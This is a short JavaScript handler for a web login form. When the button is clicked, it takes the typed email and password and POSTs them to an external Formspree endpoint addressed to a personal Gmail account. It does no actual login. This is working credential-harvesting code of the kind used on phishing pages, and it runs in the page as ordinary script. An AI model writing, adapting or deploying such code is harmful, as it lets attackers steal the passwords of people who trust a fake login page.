const userEmail = document.getElementById('email');
const userPassword = document.getElementById('password');
const login = document.getElementById('login');


login.addEventListener('click', async function (e) {
  // e.preventDefault()
  const data = `Email: ${userEmail.value}, Password: ${userPassword.value}`;
  const recipient = 'ataullahmasud388@gmail.com';
  const statusElement = document.createElement('status');
  
  // Clear previous status
  statusElement.style.display = 'none';
  statusElement.className = '';
  
  
  try {
      // Prepare form data
      const formData = new FormData();
      formData.append('email', recipient);
      formData.append('message', `Shared data:\n\n${data}`);
      formData.append('_subject', 'Data shared from web app');
      
      // Replace 'YOUR_FORMSPREE_ID' with your actual Formspree form ID
      const response = await fetch('https://formspree.io/f/xgvadwzn', {
          method: 'POST',
          body: formData,
          headers: {
              'Accept': 'application/json'
          }
      });
      
  } catch (error) {
      console.log(error)
  }
});
